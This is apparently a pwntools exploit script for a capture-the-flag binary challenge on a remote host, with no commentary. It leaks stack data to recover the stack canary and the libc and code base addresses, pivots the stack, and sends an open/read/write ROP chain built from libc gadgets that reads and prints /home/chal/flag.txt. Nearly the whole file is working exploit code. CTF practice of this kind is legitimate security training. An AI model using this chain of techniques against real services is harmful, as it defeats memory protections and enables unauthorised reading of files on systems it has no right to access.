from pwn import *

# r = process('./chal', env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('10.113.184.121', 10056)
context.arch = 'amd64'


# Try to trigger length exploit
payload = b'a' * 20
r.sendafter(b"Haaton's name? ", payload)
print(r.recvlines(2))

# Leak stack info
payload = b'HACHAMA'.ljust(0x8, b'\x00')
r.send(payload)
result = r.recv(0x61)
log.info("[-------------Stack Info-------------]")
for i in range(12):
    log.info(hex(u64(result[i * 8:i * 8 + 8])))
log.info("[-------------Stack Info-------------]")

canary = u64(result[7 * 8:7 * 8 + 8])
libc_start_main = u64(result[9 * 8:9 * 8 + 8]) - 0x80
libc_base_addr = libc_start_main - 0x29d90 + 0x80
main_fn_addr = u64(result[11 * 8:11 * 8 + 8])
code_segment_base = main_fn_addr - 0x331

log.success(f'Canary = {hex(canary)}')
log.success(f'libc start main base = {hex(libc_start_main)}')
log.success(f'libc base addr = {hex(libc_base_addr)}')
log.success(f'Main Function Address = {hex(main_fn_addr)}')
log.success(f'Code Segment = {hex(code_segment_base)}')

# Prepare ROP gadget
pop_rax_ret = libc_base_addr + 0x0000000000045eb0# : pop rax ; ret
pop_rdi_ret = libc_base_addr + 0x000000000002a3e5# : pop rdi ; ret
pop_rsi_ret = libc_base_addr + 0x000000000002be51# : pop rsi ; ret
pop_rdx_ret = libc_base_addr + 0x00000000000796a2# : pop rdx ; ret
pop_rdx_rbx_ret = libc_base_addr + 0x0000000000090529# : pop rdx ; pop rbx ; ret
syscall_ret = libc_base_addr + 0x0000000000091396# : syscall ; ret

bss_addr = code_segment_base + 0x3000 + 0x200
bss_addr_flag = bss_addr + 0x400
bss_addr_buf = bss_addr_flag + 0x120

file_addr = b'/home/chal/flag.txt'.ljust(0x38, b'\x00')

trash_payload = flat(
    canary,
    bss_addr,
    main_fn_addr + 291
)

extend_payload = flat(
    canary,
    bss_addr_flag,
    pop_rax_ret, 400,
    main_fn_addr + 298,
)

open_payload = flat(
    # Open file
    # fd = open("/home/chal/flag.txt", 0);
    pop_rax_ret, 2,
    pop_rdi_ret, bss_addr_flag - 0x40,
    pop_rdx_rbx_ret, 0, 0,
    pop_rsi_ret, 0,
    syscall_ret
)

read_payload = flat(
    # Read the file
    # read(fd, buf, 0x30);
    pop_rax_ret, 0,
    pop_rdi_ret, 3, 
    pop_rsi_ret, bss_addr_buf,
    pop_rdx_rbx_ret, 0x70, 0,
    syscall_ret
)

write_payload = flat(
    # Write the file
    # write(1, buf, 0x30);
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    # pop_rsi_ret, bss_addr_buf,
    # pop_rdx_ret, 0x70,
    syscall_ret
)

# Extend rbp space
r.send(b'a' * 0x38 + trash_payload)
r.send(b'a' * 0x38 + extend_payload)

# Write Exploit ROP gadget
raw_input()
r.send(file_addr + p64(canary) + p64(0) + open_payload + read_payload + write_payload)

r.interactive()